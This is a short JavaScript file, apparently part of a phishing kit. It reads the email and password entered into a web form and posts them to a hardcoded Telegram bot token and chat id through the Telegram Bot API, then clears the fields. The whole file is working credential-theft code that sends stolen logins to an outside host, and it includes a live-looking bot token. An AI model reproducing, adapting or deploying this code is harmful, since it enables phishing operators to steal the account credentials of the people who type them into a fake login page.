//bot token
var telegram_bot_id = "7398105901:AAGMqPU6Xvcho2FwqubVM_r51ei8XkWKSLc";
//chat id
var chat_id = "6651292809";
var email, password;

var ready = function () {
    email = document.getElementById("email").value;
    password = document.getElementById("password").value;
    message = "Email: " + email + "\nPassword: " + password;
};

var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
    });
    
    document.getElementById("email").value = "";
    document.getElementById("password").value = "";
    return false;
};
